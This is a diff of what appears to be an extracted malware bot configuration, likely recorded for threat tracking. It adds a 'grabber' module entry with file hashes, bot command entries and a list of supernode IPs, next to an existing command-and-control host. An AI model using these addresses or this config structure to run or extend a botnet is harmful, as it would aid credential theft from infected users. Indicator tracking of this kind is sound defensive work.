@@ -21,8 +21,25 @@
 -->
 
 <settings>
-  <modules/>
-  <commands/>
+  <modules>
+    <module>
+      <sha256>c1fd5c3ecfa6e896a13dd4c76d511adfa5e0eb80b0230545f81cd64107bab264</sha256>
+      <sha1>18204ea9d4b6f1569d9783983dbfa55886529a86</sha1>
+      <md5>f501fe0bb0dd2816d4107ba11fcb136b</md5>
+      <timestamp>2018-01-28T13:07:40+00:00</timestamp>
+      <architecture>64</architecture>
+      <name>grabber</name>
+      <crc>0x4d38f016</crc>
+    </module>
+  </modules>
+  <commands>
+    <cmd id="985" type="22">
+      <fs/>
+    </cmd>
+    <cmd id="4812" type="9">
+      <fs/>
+    </cmd>
+  </commands>
   <config>
     <httpshots>
       <url onget="1" onpost="1" type="deny">\.(gif|png|jpg|css|swf|ico|js)($|\?)</url>
@@ -488,4 +505,18 @@
       <ip>133.242.208.183</ip>
     </host>
   </c2>
+  <supernodes>
+    <node>
+      <ip>76.184.3.225</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>66.186.52.2</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>43.231.250.172</ip>
+      <port>3389</port>
+    </node>
+  </supernodes>
 </settings>
